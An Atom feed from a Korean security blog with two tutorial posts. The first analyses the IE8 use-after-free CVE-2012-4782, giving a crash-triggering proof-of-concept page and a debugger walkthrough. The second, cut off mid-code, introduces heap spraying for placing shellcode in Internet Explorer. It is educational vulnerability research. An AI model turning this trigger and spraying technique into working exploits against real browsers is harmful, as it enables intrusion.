<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
  <link href="http://localhost:4000/author/Joel/feed.xml" rel="self" type="application/atom+xml" />
  <link href="http://localhost:4000/" rel="alternate" type="text/html" />
  <updated>2019-07-26T22:43:29+09:00</updated>
  <id>http://localhost:4000/author/Joel/feed.xml</id>

  
  
  

  
    <title type="html">LIN ARENA | </title>
  

  
    <subtitle>LIN ARENA Technology Blog</subtitle>
  

  

  
    
      
    
      
    
      
    
      
    
      
    
  

  
  

  
    <entry>
      <title type="html">CVE-2012-4782</title>
      <link href="http://localhost:4000/windows-0x0e" rel="alternate" type="text/html" title="CVE-2012-4782" />
      <published>2019-07-22T03:00:00+09:00</published>
      <updated>2019-07-22T03:00:00+09:00</updated>
      <id>http://localhost:4000/windows-0x0e</id>
      <content type="html" xml:base="http://localhost:4000/windows-0x0e">&lt;h1 id=&quot;0x0e-ie8-exploit&quot;&gt;0x0e IE8 Exploit&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘은 지금까지 알아 본 기법을 토대로 exploit을 다루어 보고자 합니다.&lt;/p&gt;

&lt;p&gt;2019년에 나온 CVE를 바로 다루어 보려고 하다가 차근차근 가보자는 생각으로 IE8부터 설명하기로 했답니다.&lt;/p&gt;

&lt;p&gt;이번 블로그에서 연재하는 CVE-2012-4782는 IE8에서 발생하는 UAF 취약점입니다.&lt;/p&gt;

&lt;p&gt;Exodus 블로그를 많이 참조해서 글이 작성된 점을 먼저 안내 드립니다.&lt;/p&gt;

&lt;h5 id=&quot;환경-구성&quot;&gt;환경 구성&lt;/h5&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;OS&lt;/td&gt;
      &lt;td&gt;Windows XP Service Pack 3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;IE&lt;/td&gt;
      &lt;td&gt;8.0.6001&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Affect Ver.&lt;/td&gt;
      &lt;td&gt;IE6, IE7, IE8&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h5 id=&quot;poc&quot;&gt;POC&lt;/h5&gt;

&lt;p&gt;분석에 사용할 POC는 아래와 같습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;helloWorld&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	
	&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;e0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// form&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;e1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// dfn&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;e2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// q&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;e1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;applyElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;e1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'button'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;e1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;applyElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outerText&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'body'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;CollectGarbage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){}&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onload=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;eval(helloWorld())&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;dfn&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dfn&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 코드를 실행하기 전에 아래 명령어로 몇 가지 설정을 해두고 분석을 하겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gflag.exe /i iexplore.exe +hpa +ust
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;hpa : 페이지 힙 설정
ust : 유저 스택 트레이스 설정으로 유저모드의 스택 결과를 데이터베이스화하여 저장해두는 것&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이제 windbg로 실행 결과를 보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 실행 결과를 보면 mshtml!CMarkup::OnLoadStatusDone+0x4ef에서 Access Violation Error가 발생하는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;에러 발생 이유를 추측해보면 move eax, dword ptr [edi]에서 edi 값에 문제가 있는 것 같습니다.&lt;/p&gt;

&lt;p&gt;edi에 어떤 문제가 있어서 이런 에러가 발생하는지 살펴보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;첫 번째 빨간 박스에 CButton이라고 적혀 있는 것을 보면 edi는 Button 객체였다는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 vector deleting destructor를 보아 free된 객체인 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 아래 CollectGarbage를 보면 더 확실해지네요.&lt;/p&gt;

&lt;p&gt;CollectGarbage 함수에 의해 가장 윗줄 RtlFreeHeap까지 실행되어 오면서 Button 객체가 free된 것이라 생각할 수 있습니다.&lt;/p&gt;

&lt;p&gt;객체가 해제된 뒤 그 객체에서 에러가 발생한다는 것은??&lt;/p&gt;

&lt;p&gt;해제된 그 객체를 edi를 통해 다시 사용하려고 접근했기 때문이라고 추측할 수 있죠. 즉 여긴 UAF 취약점이 발생하는구나.&lt;/p&gt;

&lt;p&gt;그럼 이제 CButton 객체가 생성되는 과정부터 해제하는 과정을 살펴보겠습니다.&lt;/p&gt;

&lt;p&gt;먼저, CButton 생성 과정입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;CButton은 CButton::CreateElement에서 HeapAlloc 함수를 이용해서 할당되는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;생성 시, 58h만큼 크기를 할당받는 것도 알 수 있네요.&lt;/p&gt;

&lt;p&gt;그리고 HeapAlloc 함수가 끝난 뒤, 결과 값을 esi에 넣어주는 것도 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;다음은 CButton 객체를 해제하는 과정을 살펴볼게요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;해제 과정에서는 esi의 값을 push하여 해당 객체를 해제한다는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;객체 생성 결과를 담은 esi와 해제 시에 사용한 esi가 같은 값인지는 조금 있다가 windbg로 살펴보겠습니다.&lt;/p&gt;

&lt;p&gt;지금까지 우리는 CButton 객체의 생성과 해제 로직을 살펴봤습니다.&lt;/p&gt;

&lt;p&gt;근데 에러 메시지를 보면 edi에서 에러가 발생하는데 이 edi는 갑자기 어디서 나오는 걸까요??&lt;/p&gt;

&lt;p&gt;edi를 추적해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;에러가 났던 OnLoadStatusDone 함수를 추적해본 결과, CElement::FindDefaultElem 함수에서 그 결과 값을 edi에 넣어준다는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;그럼 이제 CElement::FindDefaultElem을 살펴봐야겠죠?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;코드를 따라가보면 CElement::Doc라는 함수의 결과를 edi에 넣어주고 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_8.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;그리고 [edi+1A8h]를 eax에 넣어주고 난 뒤 CElement::FindDefaultElem가 종료됩니다.&lt;/p&gt;

&lt;p&gt;왜 [edi+1A8h]에 해제된 CButton 객체가 있는지, CElement::Doc가 어떤 것을 반환하는지 알아봐야겠네요.&lt;/p&gt;

&lt;p&gt;CElement::FindDefaultElem 시작 위치에 브레이크 포인트를 설정하고 코드를 따라가봤습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_9.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;코드를 실행시키다보니 아까 위에서 살펴봤던 Doc가 보이고 결과 값이 eax에 들어가 있는 것도 보입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_10.png&quot; alt=&quot;[그림 1-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;우리가 살펴보고자 했던 [edi+1A8h]까지 왔습니다.&lt;/p&gt;

&lt;p&gt;아까 eax에 담겨 있던 값이 edi에 담겨 있고 또 vtable이라는 내용도 확인이 되네요.&lt;/p&gt;

&lt;p&gt;그럼 저 [edi+1A8h]는 해제된 CButton 객체의 vtable 값이라는 것이라는 것도 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;이제 [edi+1A8h]에 CButton 객체의 vtable 값이 언제 쓰이는지만 파악하면 되겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_11.png&quot; alt=&quot;[그림 1-11]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림처럼 mshtml!CDoc::operator new+0x00000013 부분에 브레이크를 설정하고 분석을 했습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_15.png&quot; alt=&quot;[그림 1-15]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;코드를 쭉 따라가보면 위 그림과 같이 객체를 생성하는 부분을 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;이 결과 값 + 1A8h 위치에 값을 쓸 때 브레이크를 잡도록 설정해야겠네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_12.png&quot; alt=&quot;[그림 1-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;따라가보니 SetDefaultElem에서 eax+1A8h 위치에 값을 적는다는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;esi와 edi 값을 확인해보면 아래와 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_13.png&quot; alt=&quot;[그림 1-13]&quot; /&gt;
&lt;/figure&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0e_14.png&quot; alt=&quot;[그림 1-14]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;esi는 Cdoc이고 edi에 CButton 객체의 주소가 들어가 있는 것을 확인했습니다.&lt;/p&gt;

&lt;p&gt;그런데 도대체 왜 SetDefaultElem에서 해제된 객체의 주소를 적어주는 걸까요??&lt;/p&gt;

&lt;p&gt;Exodus 블로그에서는 SetDefaultElem에서 CDoc 객체에 레퍼런스를 추가하기전에 Addref를 호출하는 것을 잊어버린 것 같다라고 말하고 있습니다.&lt;/p&gt;

&lt;p&gt;객체 참조시 Addref를 통해서 Count를 증가시키고 Release를 통해서 Count를 감소시키는데 0이 아니면 해제하지 않도록 되어 있습니다.&lt;/p&gt;

&lt;p&gt;이런 경우, 균형이 맞지 않게 되어 원치 않게 객체가 해제되는 경우라고 볼 수 있겠습니다.&lt;/p&gt;

&lt;p&gt;그래서 다른 레퍼런스를 제거하는 것으로 인해 객체가 해제되지만 Cdoc 객체에서 DefaultElem을 통해 계속 접근 가능한 것으로 판단됩니다.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;긴 글 읽으시느라 고생하셨습니다.&lt;/p&gt;

&lt;p&gt;설명이 너무 길어져서 실제 공격은 다음 글로 넘겨서 진행하겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x0e IE8 Exploit</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Heap Spray</title>
      <link href="http://localhost:4000/windows-0x0d" rel="alternate" type="text/html" title="Heap Spray" />
      <published>2019-06-27T20:18:00+09:00</published>
      <updated>2019-06-27T20:18:00+09:00</updated>
      <id>http://localhost:4000/windows-0x0d</id>
      <content type="html" xml:base="http://localhost:4000/windows-0x0d">&lt;h1 id=&quot;0x0d-heap-spray&quot;&gt;0x0d Heap Spray&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Heap Spray에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-heap-spray&quot;&gt;What is Heap Spray?&lt;/h5&gt;

&lt;p&gt;Heap Spray는 단어 그대로 Heap 영역에 (Spray로 약을 뿌리듯) 전체적으로 골고루 Payload를 구성하는 것을 말합니다.&lt;/p&gt;

&lt;p&gt;BOF나 UAF 등의 공격을 할 때 각종 메모리 보호기법이 적용되어 있으면, Shell Code가 위치하는 곳의 주소를 정확하게 지정할 수 없겠죠?&lt;/p&gt;

&lt;p&gt;이때 Heap 전체에 내가 원하는 코드를 골고루 위치시켜서 예측 가능한 공간에 Payload를 구성하기 위한 기법이죠.&lt;/p&gt;

&lt;p&gt;그래서 공격 순서는 주로 Heap Spary를 통해 Payload를 구성하고 버그/취약점을 이용해서 공격을 하고 EIP가 내가 구성해놓은 Payload가 있는 곳을 가르키도록 합니다.&lt;/p&gt;

&lt;p&gt;오늘은 Internet Explorer 6을 가지고 기초 개념을 익힌 다음, 최신 버전으로 조금씩 업그레이드 해볼게요.&lt;/p&gt;

&lt;p&gt;(브라우저를 가지고 진행하는 이유는 자바스크립트나 VB스크립트를 이용해서 메모리에 데이터 삽입을 쉽게 할 수 있다는 이점이 있기 때문입니다.
하지만, 브라우저에서만 할 수 있는게 아니라는 점도 같이 기억해둡시다.)&lt;/p&gt;

&lt;h5 id=&quot;기본-원리&quot;&gt;기본 원리&lt;/h5&gt;

&lt;h6 id=&quot;문자열-할당&quot;&gt;문자열 할당&lt;/h6&gt;

&lt;p&gt;브라우저 메모리에 특정 데이터를 할당시키는 가장 기본적인 방법은 자바스크립트를 이용해서 변수를 생성하고 값을 할당하는 것입니다.&lt;/p&gt;

&lt;p&gt;먼저, 아래와 같이 코드를 구성하고 Heap 메모리에 데이터를 할당해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;HACK&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		
	&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Alloc Done!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 코드를 브라우저에서 실행시킨 다음 Immunity Debugger로 어떻게 할당되는지 살펴보겠습니다.&lt;/p&gt;

&lt;p&gt;Immunity에서 File &amp;gt; Attach &amp;gt; Internet Explorer로 Attach를 한 뒤,&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona find -s &quot;HACK&quot; -unicode -x *
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;명령을 사용하면 해당 값을 확인할 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 값을 보면 HACK이라는 값이 들어가 있는 것을 확인할 수 있죠?&lt;/p&gt;

&lt;p&gt;그런데 여기에 우리가 좀 더 살펴봐야할 점들이 있습니다.&lt;/p&gt;

&lt;p&gt;먼저, “HACK”이라는 값은 들어갔는데 48 00 41 00 43 00 4B 00이네? 값 사이에 Null이 있는데 어떻게 Payload를 구성하지?&lt;/p&gt;

&lt;p&gt;이건 해당 값이 유니코드 형식으로 변환되기 때문인데 이를 이해하려면 먼저 BSTR 문자열 객체를 이해해야 합니다.&lt;/p&gt;

&lt;h6 id=&quot;bstr&quot;&gt;BSTR?&lt;/h6&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;BSTR Header&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;문자열 값&lt;/th&gt;
      &lt;th style=&quot;text-align: right&quot;&gt;Null Terminator&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;4 Byte&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;String * 2 Byte&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;2 Byte&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;사실 문자열이 할당되면 이 문자열은 BSTR 문자열 객체로 변환됩니다. 이 객체는 헤더+문자열+종단값 형식으로 구성되어 있습니다.&lt;/p&gt;

&lt;p&gt;문자열이 BSTR 문자열 객체로 변환되게 되면 기존 값이 유니코드 형식의 값으로 변형되어 저장되는 특징이 있습니다.&lt;/p&gt;

&lt;p&gt;그래서 예제에서 넣은 “HACK”이라는 문자열이 “48 00 41 00 43 00 4B 00”로 변환되어 저장되는 것이죠.&lt;/p&gt;

&lt;p&gt;그리고 위에서 헤더와 종단값을 가진다고 했는데 헤더는 변환된 문자열의 길이를 나타내는 4바이트 값입니다.&lt;/p&gt;

&lt;p&gt;종단값은 이 객체의 끝을 나타내기 위해 “00 00” 2바이트 값으로 구성되어 있습니다.&lt;/p&gt;

&lt;p&gt;앞에서 사용한 예제를 BSTR 객체 전체가 보이게 나타낸 그림입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;HACK 문자열이 “48 00 41 00 43 00 4B 00”로 변환되니까 헤더 값이 08 00 00 00(리틀엔디안)인 것도 보입니다.&lt;/p&gt;

&lt;p&gt;이제 BSTR 구조는 이해가 되시죠?&lt;/p&gt;

&lt;p&gt;아 그럼 유니코드 형식으로 바뀌기 때문에 그렇다는건 이해하겠는데 Null은 어떻게 해결할건가요??&lt;/p&gt;

&lt;h6 id=&quot;null&quot;&gt;Null?&lt;/h6&gt;

&lt;p&gt;다행히도 자바스크립트에 unescape 함수를 사용하면 아주 쉽게 해결이 됩니다.&lt;/p&gt;

&lt;p&gt;unescape 함수는 인코딩된 문자를 디코딩하는 역할을 수행합니다.&lt;/p&gt;

&lt;p&gt;그래서 이 함수에게 문자열을 전달할 때 해당 문자열이 원래 유니코드임을 알려주면 이 함수는 해당 내용을 유니코드로 변환하지 않게 됩니다.&lt;/p&gt;

&lt;p&gt;코드는 다음과 같이 변환했습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
